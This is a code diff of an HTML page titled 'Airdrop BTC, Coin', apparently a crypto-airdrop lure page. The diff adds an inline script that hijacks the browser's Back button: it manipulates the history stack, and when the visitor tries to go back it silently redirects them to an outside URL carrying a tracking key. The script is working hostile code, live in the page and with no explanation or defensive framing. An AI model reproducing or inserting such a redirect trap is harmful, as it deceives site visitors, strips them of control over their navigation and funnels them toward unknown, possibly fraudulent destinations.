@@ -4,6 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Airdrop BTC, Coin</title>
+    <script type="text/javascript">
+    (function(window, location) {
+    history.replaceState(null, document.title, location.pathname+"#!/history");
+    history.pushState(null, document.title, location.pathname);
+    
+    window.addEventListener("popstate", function() {
+      if(location.hash === "#!/history") {
+        history.replaceState(null, document.title, location.pathname);
+        setTimeout(function(){
+          location.replace("https://roastwearwritten.com/bmu1rhf7?key=e3ff974fd2665b1074e29d32efa30da4");
+        },0);
+      }
+    }, false);
+    }(window, location));
+    </script>
     <style>
         /* Gaya dasar untuk body */
         body {
